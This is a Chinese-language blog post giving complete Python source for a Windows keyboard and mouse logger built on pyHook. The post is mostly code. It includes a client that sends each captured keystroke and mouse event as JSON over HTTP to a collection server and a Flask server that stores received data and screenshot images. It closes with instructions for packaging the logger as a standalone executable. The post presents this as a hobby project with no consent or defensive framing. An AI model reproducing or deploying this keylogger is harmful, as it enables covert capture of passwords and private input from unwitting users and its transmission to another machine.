---
title: Python之windows键盘鼠标记录器
author: Pandaho
date: 2020-04-27 20:00:00 
categories: [Project] 
tags: [python]
image: /assets/img/python-keyboard-and-mouse/cover.png
---




##  简介

利用python将windows下键盘和鼠标的操作信息截取转换为JSON格式，通过HTTP发送至服务器

主要分为3个模块，client、server、keyboard-and-mouse。

在服务端启用server，keyboard-and-mouse截取信息后调用client，发送至http_post_json指向的服务器。

### 架构图

![图例](/assets/img/python-keyboard-and-mouse/1.png)


### Python模块

"Pyhook”是一个基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。

[Flask](http://flask.pocoo.org/)是一个Python编写的Web 微框架，让我们可以使用Python语言快速实现一个网站或Web服务。



### 背景说明

- Python3.7
- Windows

##  流程

下载地址： [pyHook](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook)



client：

```python
from http.client import HTTPConnection
import json

def http_post_json(ip,dict_data,port=5000):
    c = HTTPConnection(ip,port=port)
    
    headers = {}
    headers['Content-Type'] = 'application/json'
    post_json_data = json.dumps(dict_data).encode ('utf-8')
    c.request('POST','/server_json', body=post_json_data, headers=headers)
if __name__ == "__main__":
    json_data = {"from": "akjflw","to":"fjlakdj", "amount": 3}
    http_post_json('127.0.0.1',json_data)
```



server：

```python
from flask import Flask 
from flask import request
import base64
import json
from datetime import datetime
node = Flask(__name__)

def b64_img(b64):
    b4code = bytes(b64,'utf8')
    img = base64.b64decode(b4code)
    return img
@node.route('/server_json',methods=['POST'])

def transaction():
    if request.method == 'POST':
        json_data = request.get_json()
        if json_data['MessageType'] == 'ImageEvent':
            filename = datetime.now().strftime("%Y-%m-%d %H:%M:%S")+'.bmp'
            recv_image = open(filename,'wb')
            recv_image.write(b64_img(json_data['Imageb64']))
            recv_image.close()
        else:
            print(json_data)
        return 'got data!!!'
if __name__ == '__main__':
    node.run(host = '0.0.0.0')
```



keyboard-and-mouse：

```python
import pythoncom,pyHook
from client import http_post_json
def OnKeyboardEvent(event):
    dict_key = {}
    dict_key['MessageType'] = 'KeyboardEvent'
    dict_key['MessageName'] = event.MessageName
    dict_key['Time'] = event.Time
    dict_key['Key:'] = event.Key
    http_post_json('127.0.0.1',dict_key)
    return True

def OnMouseEvent(event):
    dict_key = {}
    dict_key['MessageType'] = 'MouseEvent'
    dict_key['MessageName'] = event.MessageName
    dict_key['Time'] = event.Time
    dict_key['Position'] = event.Position
    dict_key['Wheel'] = event.Wheel
    http_post_json('127.0.0.1',dict_key)
    return True

def key_mouse_logger():
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    hm.MouseAll = OnMouseEvent
    hm.HookMouse()
    pythoncom.PumpMessages()
    
if __name__ == '__main__':
    key_mouse_logger()
```



其中需要注意的问题：

1、pyHook对应cp号对应python版本，需要特别注意别下载错了

2、No module named ‘pythoncom’问题

```
pip install pywin32
```

3、如果想在没有python的环境下运行需要使用pyinstaller

```
pip install pyinstaller
pyinstaller --onefile *.py
```

